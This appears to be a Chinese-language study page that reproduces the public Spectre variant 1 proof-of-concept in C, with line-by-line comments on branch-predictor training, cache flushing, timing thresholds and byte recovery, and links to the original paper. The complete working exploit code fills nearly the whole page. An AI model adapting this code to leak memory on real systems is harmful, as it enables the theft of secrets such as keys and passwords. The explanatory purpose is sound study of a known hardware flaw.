
# Spectre漏洞示例代码注释

## 论文地址

[中文译文](http://bbs.antiy.cn/forum.php?mod=viewthread&tid=77671&extra=page%3D1)

[原文](https://spectreattack.com/spectre.pdf)

## 代码中文注释（有部分修改）

``` C
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else

#include <x86intrin.h> /* for rdtscp and clflush */

#endif

/* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif

/********************************************************************
Victim code.(受害者——spectre被利用的地方)
********************************************************************/
unsigned int array1_size = 16;                                               // 定义array1的大小
uint8_t array1[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15}; // 定义array1
uint8_t array2[256 * 512]; // 侧信道接收者(cache一次取一页,大小为512B,所以每个接收点要隔512B)

const char *secret = "The Magic Words are Squeamish Ossifrage."; // 测试读取的数据

/*
 * 侧信道发送者
 * 注意:因为array1定义成0..15,所以在训练"分支预测"的时候,会发送array1的相关数据,这部分数据在接收时要过滤。
 * */
uint8_t temp = 0; // 使用 temp 全局变量阻止编译器优化 victim_function()
void victim_function(size_t x)
{
    if (x < array1_size)
    {
        /*
         * 侧信道发送者
         * 通过array1[x]获取秘密值,通过array2[array1[x] * 512]将秘密值
         * 映射为array2对应接收点是否被缓存,接收者检查array2的256个接收点
         * 是否被缓存来恢复信息(array2索引/512)
         */
        temp &= array2[array1[x] * 512];
    }
}

/********************************************************************
Analysis code(攻击者——攻击spectre漏洞并获取数据的地方)
********************************************************************/
/*
    cache 命中阀值，是一个经验值，默认值 80。
    该数值与内存质量、CPU多项参数有关，是一个经验值，取值大致范围：16 - 176
*/
#define CACHE_HIT_THRESHOLD (80)

/*
 * malicious_x: 秘密值于array1的地址差,侧信道发送者通过 array1[malicious_x] 取得秘密值
 *
 * */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
    static int results[256]; // 保存索引对应的ascii码被缓存的次数,选择最高的两个返回
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++)
        results[i] = 0; // 初始化

    /*
        每个字符多次尝试获取以增加成功率
    */
    for (tries = 999; tries > 0; tries--)
    {
        /*
            清空array2中每个接收点的缓存
        */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]);

        /*
            分支训练
            尝试30次,当j能被6整除时,发送秘密值
         */
        training_x = tries % array1_size; // 确保 training_x < array1_size, 训练分支为真
        for (j = 29; j >= 0; j--)
        {
            /* 清空 array1_size 的缓存
             * 当进入受害者if判断条件时,利用缓存array1_size时的速度差,让CPU有时间执行分支预测
             */
            _mm_clflush(&array1_size);

            /*
                100 次内存取值用作延时，确保 cache 页全部换出
            */
            for (volatile int z = 0; z < 100; z++)
            {
            }

            /*
                j % 6 =  0 则 x = 0xFFFF0000
                j % 6 != 0 则 x = 0x00000000
            */
            x = (size_t)(((j % 6) - 1) & ~0xFFFF);
            /*
                j % 6 =  0 则 x = 0xFFFFFFFF
                j % 6 != 0 则 x = 0x00000000
            */
            x = (x | (x >> 16));
            /*
                j % 6 =  0 则 x = malicious_x
                j % 6 != 0 则 x = training_x
            */
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim! */
            victim_function(x);
        }
        /*
            退出此函数时,接受者array2已经保存了秘密值(实际上是保存了对应接收点的读取速度信息)
        */

        /*
            读取时间。执行顺序轻微混淆防止 stride prediction（某种分支预测方法）
            i 取值 0 - 255 对应 ASCII 码表
        */
        for (i = 0; i < 256; i++)
        {
            /*
                167  0xA7  1010 0111
                13   0x0D  0000 1101
                取值结果为 0 - 255 随机数且不重复
               TODO: 好6的数学,不解释,不懂
            */
            mix_i = ((i * 167) + 13) & 255;
            /*
                addr为mix_i对应接收点的地址
            */
            addr = &array2[mix_i * 512];
            /*
                time1 保存当前时间戳计数器计数
                junk 保存 TSC_AUX 寄存器值(没有不用管)
            */
            time1 = __rdtscp(&junk);
            /*
                获取数据，用以测试时间
            */
            junk = *addr;
            /*
                记录耗时(如果是秘密值对应的接收点,因为分支预测被读取而缓存,读取速度较快;其余点未缓存较慢,
                所以这里要尽可能地让对应接收点缓存,其余点不要缓存)
            */
            time2 = __rdtscp(&junk) - time1;
            /*
                根据是否小于时间阈值判断是否命中,
                同时应注意,mix_i不应该等于分支训练使用的x值,因为在训练中它一定被缓存过了
            */
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != training_x)
                results[mix_i]++; // 命中,mix_i为秘密值的ascii码,results对应位置+1
        }

        /*
            排序,获取results中命中率最高的两个ascii码,分别存储在 j(最高命中),k（次高命中） 里

        */
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* 如果j,k对应的命中率满足上述条件,判为成功获取秘密值,跳出 */
    }

    /*
        使用 junk 防止优化输出
    */
    results[0] ^= junk;
    value[0] = (uint8_t)j; // 最优值
    score[0] = results[j]; // 最优值命中率
    value[1] = (uint8_t)k; // 次优值
    score[1] = results[k]; // 次优值,命中率
}

int main(int argc, const char **argv)
{
    printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
    size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
    int score[2], len = strlen(secret);
    uint8_t value[2];

    for (size_t i = 0; i < sizeof(array2); i++)
        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
    if (argc == 3)
    {
        sscanf_s(argv[1], "%p", (void **)(&malicious_x));
        malicious_x -= (size_t)array1; /* Convert input value into a pointer */
        sscanf_s(argv[2], "%d", &len);
        printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);
    }

    printf("Reading %d bytes:\n", len);
    while (--len >= 0)
    {
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        readMemoryByte(malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d ", value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X='%c' score=%d)", value[1],
                   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
                   score[1]);
        printf("\n");
    }
#ifdef _MSC_VER
    printf("Press ENTER to exit\n");
    getchar(); /* Pause Windows console */
#endif
    return (0);
}
```
